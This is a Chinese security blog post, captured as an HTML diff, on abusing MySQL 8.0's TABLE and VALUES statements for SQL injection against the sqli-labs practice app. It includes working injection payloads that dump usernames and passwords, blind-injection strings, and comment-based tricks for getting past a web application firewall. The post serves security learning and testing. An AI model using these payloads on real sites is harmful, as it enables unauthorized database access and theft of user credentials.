@@ -1,0 +1,419 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,MySQL,SQL注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析MySQL8.0新特性利用 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析MySQL8.0新特性利用
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-09-01T14:51:45.000Z">
+        2021-09-01
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-MySQL-8-0环境搭建"><a href="#0x01-MySQL-8-0环境搭建" class="headerlink" title="0x01 MySQL 8.0环境搭建"></a>0x01 MySQL 8.0环境搭建</h2><p>在PHPstudy中支持的MySQL 8版本为8.0.12，但是实际利用到的新特性是在MySQL 8.0.19之后才出现的，因此需要自行搭建对应的MySQL环境。</p>
+<p>这里就本地下载Windows最新版搭建，参考菜鸟教程进行Windows本地安装：<a href="https://www.runoob.com/mysql/mysql-install.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-install.html</a></p>
+<p>接着，在my.ini文件中添加如下内容：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default_authentication_plugin</span>=mysql_native_password</span><br></pre></td></tr></table></figure>
+<p>安装好运行登录之后需要修改密码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'root'</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure>
+<p>最后重启MySQL服务即可：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net stop mysql</span><br><span class="line">net start mysql</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-MySQL-8-0新特性"><a href="#0x02-MySQL-8-0新特性" class="headerlink" title="0x02 MySQL 8.0新特性"></a>0x02 MySQL 8.0新特性</h2><h3 id="TABLE语句"><a href="#TABLE语句" class="headerlink" title="TABLE语句"></a>TABLE语句</h3><h4 id="用法简介"><a href="#用法简介" class="headerlink" title="用法简介"></a>用法简介</h4><p>官方文档：<a href="https://dev.mysql.com/doc/refman/8.0/en/table.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p>
+<p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列。</p>
+<p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>
+<h4 id="TABLE与SELECT"><a href="#TABLE与SELECT" class="headerlink" title="TABLE与SELECT"></a>TABLE与SELECT</h4><p>TABLE语句在某些方面的行为类似于SELECT。给定存在一个名为的表t，以下两个语句将产生相同的输出：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TABLE t;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t;</span><br></pre></td></tr></table></figure>
+<p>比如：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/1.png" alt=""></p>
+<p>TABLE和SELECT关键区别：</p>
+<ul>
+<li><p>TABLE始终显示表的所有列；</p>
+</li>
+<li><p>TABLE不允许对行进行任意过滤，也就是说，TABLE不支持任何WHERE子句；</p>
+</li>
+</ul>
+<p>可以通过ORDER BY和LIMIT这两各关键字实现限制返回的表列来获取指定的行。</p>
+<h4 id="UNION联合查询替换"><a href="#UNION联合查询替换" class="headerlink" title="UNION联合查询替换"></a>UNION联合查询替换</h4><p>TABLE可以替换UNION SELECT结构，也可以和SELECT交叉使用，注意两个table的列数必须相同：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">table security.users union table security.referers;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> security.referers;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">table</span> security.referers;</span><br><span class="line">table security.users union <span class="keyword">select</span> * <span class="keyword">from</span> security.referers;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/2.png" alt=""></p>
+<h4 id="SELECT-xx-INTO-OUTFILE替换"><a href="#SELECT-xx-INTO-OUTFILE替换" class="headerlink" title="SELECT xx INTO OUTFILE替换"></a>SELECT xx INTO OUTFILE替换</h4><p>可以使用TABLE替换SELECT xx INTO OUTFILE的SELECT：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">table security.users into outfile 'D:\\tmp\\dump.txt';</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\tmp\\dump.txt'</span>;</span><br></pre></td></tr></table></figure>
+<p>注意，在使用INTO OUTFILE语句的时候，MySQL会报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>
+<p>此时，输入如下sql查询语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &apos;%secure_file_priv%&apos;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>看到secure_file_priv的值为NULL，表示限制不能导入导出。</p>
+<p>secure_file_priv参数用于限制<code>LOAD DATA</code>、<code>SELECT xx INTO OUTFILE</code>、<code>LOAD_FILE()</code>等：</p>
+<ul>
+<li>NULL：表示限制mysqld不允许导入或导出；</li>
+<li>/tmp：表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行；</li>
+<li>没有值：表示不限制mysqld在任意目录的导入导出；</li>
+</ul>
+<p>又因为secure_file_priv参数是只读参数，不能使用set global命令修改。</p>
+<p>正确的解决办法是在my.ini中添加如下配置，然后重启MySQL即可：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">''</span></span><br></pre></td></tr></table></figure>
+<p>现在就没问题了：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/3.png" alt=""></p>
+<h4 id="SELECT-xx-INTO-DUMPFILE替换"><a href="#SELECT-xx-INTO-DUMPFILE替换" class="headerlink" title="SELECT xx INTO DUMPFILE替换"></a>SELECT xx INTO DUMPFILE替换</h4><p>和前面OUTFILE是类似的，关键区别在于：</p>
+<ul>
+<li>OUTFILE导出全部数据，DUMPFILE只能导出一行数据；</li>
+<li>OUTFILE在将数据写到文件里时有特殊的格式转换，而DUMPFILE则保持原数据格式；</li>
+</ul>
+<p>因此，在使用DUMPFILE时需要结合limit选定指定行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table security.users limit 1 into dumpfile 'D:\\tmp\\dump.txt';</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/4.png" alt=""></p>
+<h4 id="子查询替换"><a href="#子查询替换" class="headerlink" title="子查询替换"></a>子查询替换</h4><p>当子查询的表只有单列时，可以使用TABLE语句来替换SELECT进行子查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="keyword">table</span> security.vips);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="keyword">select</span> * <span class="keyword">from</span> security.vips);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> security.vips);</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/5.png" alt=""></p>
+<h4 id="INSERT-xx-SELECT替换"><a href="#INSERT-xx-SELECT替换" class="headerlink" title="INSERT xx SELECT替换"></a>INSERT xx SELECT替换</h4><p>参考文档改下即可：</p>
+<p><a href="https://dev.mysql.com/doc/refman/8.0/en/insert-select.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/insert-select.html</a></p>
+<h4 id="CREATE-TABLE-VIEW-xx-SELECT替换"><a href="#CREATE-TABLE-VIEW-xx-SELECT替换" class="headerlink" title="CREATE TABLE/VIEW xx SELECT替换"></a>CREATE TABLE/VIEW xx SELECT替换</h4><p>参考文档改下即可：</p>
+<p><a href="https://dev.mysql.com/doc/refman/8.0/en/create-table-select.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/create-table-select.html</a></p>
+<p><a href="https://dev.mysql.com/doc/refman/8.0/en/create-view.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/create-view.html</a></p>
+<h3 id="VALUES语句"><a href="#VALUES语句" class="headerlink" title="VALUES语句"></a>VALUES语句</h3><h4 id="用法简介-1"><a href="#用法简介-1" class="headerlink" title="用法简介"></a>用法简介</h4><p>官方文档：<a href="https://dev.mysql.com/doc/refman/8.0/en/values.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/values.html</a></p>
+<p>VALUES是MySQL 8.0.19中引入的DML语句，该语句返回一组一个或多个行作为表。换句话说，它是一个表值构造函数，还可以充当独立的SQL语句。</p>
+<p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line">    ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure>
+<p>该语句由VALUES关键字组成，后跟一个或多个行构造函数的列表，以逗号分隔。行构造函数由ROW()行构造子句组成，该子句的值列表包含在括号中的一个或多个标量值。值可以是任何MySQL数据类型的文字，也可以是解析为标量值的表达式。</p>
+<p>ROW()不能为空（但提供的每个标量值可以为NULL），并且在同一条VALUES语句中的每个语句的列的数量必须相同。</p>
+<p>简单地说，VALUES语句可以用来构造表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; values row("q", 42, '2020-02-01'), row(23, "abc", 98.6), row(27.0002, "Mary Smith", '&#123;"a": 10, "b": 25&#125;') limit 2,1;</span><br><span class="line">+<span class="comment">----------+------------+--------------------+</span></span><br><span class="line">| column_0 | column_1   | column_2           |</span><br><span class="line">+<span class="comment">----------+------------+--------------------+</span></span><br><span class="line">| 27.0002  | Mary Smith | &#123;"a": 10, "b": 25&#125; |</span><br><span class="line">+<span class="comment">----------+------------+--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>从输出表的列中看到，其中有隐含命名的列column_0、column_1、 column_2等等，索引从0开始，可使用limit输出指定行。其中的列可以是混合类型。</p>
+<h4 id="UNION联合查询替换-1"><a href="#UNION联合查询替换-1" class="headerlink" title="UNION联合查询替换"></a>UNION联合查询替换</h4><p>根据VALUES语句构造表的特性，可以和UNION联合查询中的SELECT语句进行交叉替换使用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>), <span class="keyword">row</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">values row('a','b','c') union <span class="keyword">select</span> * <span class="keyword">from</span> security.users;</span><br><span class="line">values row('a','b','c') union values row(1,2,3); // 可完全省略不用union</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/6.png" alt=""></p>
+<h2 id="0x03-在SQL注入中的利用"><a href="#0x03-在SQL注入中的利用" class="headerlink" title="0x03 在SQL注入中的利用"></a>0x03 在SQL注入中的利用</h2><p>由前面知道，TABLE和VALUES这两个语句可用于替换UNION联合查询中的SELECT进行查询，因此这部分新特性主要针对SELECT部分的过滤进行绕过利用。</p>
+<p>这里以sqli-labs为例。</p>
+<h3 id="VALUES-ROW-替换ORDER-BY推测列数"><a href="#VALUES-ROW-替换ORDER-BY推测列数" class="headerlink" title="VALUES ROW()替换ORDER BY推测列数"></a>VALUES ROW()替换ORDER BY推测列数</h3><p>推测列数无需ORDER BY，直接用VALUES语句即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,2)%23</span><br><span class="line">?id=0&apos; union values row(1,2,3)%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/7.png" alt=""></p>
+<h3 id="UNION-VALUES联合查询"><a href="#UNION-VALUES联合查询" class="headerlink" title="UNION VALUES联合查询"></a>UNION VALUES联合查询</h3><p>应用UNION VALUES语句就能直接调用数据库内置函数查询对应的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,user(),version())%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/8.png" alt=""></p>
+<p>可以结合concat系列函数进行利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,null,concat_ws(char(32,58,32),user(),database(),version()))%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/9.png" alt=""></p>
+<p>如果WAF仅仅是过滤UNION SELECT关键字，并没有对UNION VALUES后面添加SELECT进行过滤，那么可以像正常一样利用SELECT结合concat做子查询来dump库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,null,(select group_concat(concat_ws(char(32,58,32),id,username,password)) from users))%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/10.png" alt=""></p>
+<p>当然，也可以组合TABLE语句进行查询，注意此时TABLE语句指定的表必须是只有一列且限制只能输出一行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,null,(table vips limit 0,1))%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/11.png" alt=""></p>
+<h3 id="UNION-TABLE联合查询"><a href="#UNION-TABLE联合查询" class="headerlink" title="UNION TABLE联合查询"></a>UNION TABLE联合查询</h3><p>使用UNION TABLE的时候，注意两个表的列数必须相同：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union table referers limit 0,1%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/12.png" alt=""></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>利用小于号会逐个比较一行中每一列值的大小来进行盲注，当然，除了小于号、其他比较符可自行构造，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; or (1,&apos;d&apos;,&apos;&apos;) &lt; (table users limit 1)%23</span><br><span class="line">?id=0&apos; or (1,&apos;e&apos;,&apos;&apos;) &lt; (table users limit 1)%23</span><br><span class="line">?id=0&apos; or (1,&apos;dumb&apos;,&apos;dumb&apos;) &lt; (table users limit 1)%23</span><br><span class="line">?id=0&apos; or (1,&apos;dumb&apos;,&apos;dumb&apos;) = (table users limit 1)%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/13.png" alt=""></p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/14.png" alt=""></p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/15.png" alt=""></p>
+<h2 id="0x04-xx绕过"><a href="#0x04-xx绕过" class="headerlink" title="0x04 xx绕过"></a>0x04 xx绕过</h2><p>本地测试xx当前版本号为V4.0.23137。</p>
+<p>用UNION SELECT妥妥的直接被拦截了：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/16.png" alt=""></p>
+<p>使用UNION VALUES就能成功绕过：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/17.png" alt=""></p>
+<p>使用UNION TABLE也能成功绕过，但要注意两个表的列数必须相同才行：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/18.png" alt=""></p>
+<p>直接使用TABLE语句盲注查询，会被拦截：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/19.png" alt=""></p>
+<p>关键的拦截特征在于将or与后面字符匹配到了，这里利用注释符的一个Trick来实现绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; or/*!90000mmmmmmmm*/(1,&apos;d&apos;,&apos;&apos;) &lt; (table users limit 0,1)%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/20.png" alt=""></p>
+<p>盲注当然是OK的，就是注入过程比较慢，这里可以使用前面说到的UNION VALUES后面添加SELECT查询的方式来尝试，原payload当然会被拦截：</p>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/21.png" alt=""></p>
+<p>这里推测WAF过滤的关键点也是在于UNION之后以及SELECT之后的关键词正则匹配，要断开这种关键词匹配同样使用前面的Trick即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union/*!90000mmmmmmmm*/values row(1,null,(select/*!90000mmmmmmmm*/group_concat(concat_ws(char(32,58,32),id,username,password)) from users))%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/22.png" alt=""></p>
+<p>OK，确实可以绕过xx。</p>
+<h2 id="0x0n-参考"><a href="#0x0n-参考" class="headerlink" title="0x0n 参考"></a>0x0n 参考</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/table.html" target="_blank" rel="noopener">TABLE Statement</a></p>
+<p><a href="https://dev.mysql.com/doc/refman/8.0/en/values.html" target="_blank" rel="noopener">VALUES Statement</a></p>
+<p><a href="https://xz.aliyun.com/t/8646" target="_blank" rel="noopener">MYSQL8.0注入新特性</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-MySQL-8-0环境搭建"><span class="toc-text">0x01 MySQL 8.0环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-MySQL-8-0新特性"><span class="toc-text">0x02 MySQL 8.0新特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TABLE语句"><span class="toc-text">TABLE语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用法简介"><span class="toc-text">用法简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TABLE与SELECT"><span class="toc-text">TABLE与SELECT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UNION联合查询替换"><span class="toc-text">UNION联合查询替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT-xx-INTO-OUTFILE替换"><span class="toc-text">SELECT xx INTO OUTFILE替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT-xx-INTO-DUMPFILE替换"><span class="toc-text">SELECT xx INTO DUMPFILE替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#子查询替换"><span class="toc-text">子查询替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#INSERT-xx-SELECT替换"><span class="toc-text">INSERT xx SELECT替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CREATE-TABLE-VIEW-xx-SELECT替换"><span class="toc-text">CREATE TABLE/VIEW xx SELECT替换</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VALUES语句"><span class="toc-text">VALUES语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用法简介-1"><span class="toc-text">用法简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UNION联合查询替换-1"><span class="toc-text">UNION联合查询替换</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-在SQL注入中的利用"><span class="toc-text">0x03 在SQL注入中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VALUES-ROW-替换ORDER-BY推测列数"><span class="toc-text">VALUES ROW()替换ORDER BY推测列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION-VALUES联合查询"><span class="toc-text">UNION VALUES联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION-TABLE联合查询"><span class="toc-text">UNION TABLE联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-xx绕过"><span class="toc-text">0x04 xx绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0n-参考"><span class="toc-text">0x0n 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/08/06/浅析JDWP远程代码执行漏洞/" rel="next" title="浅析JDWP远程命令执行漏洞">
+          浅析JDWP远程命令执行漏洞
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/" rel="prev" title="浅析Ofbiz反序列化漏洞（CVE-2020-9496）">
+            浅析Ofbiz反序列化漏洞（CVE-2020-9496）
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
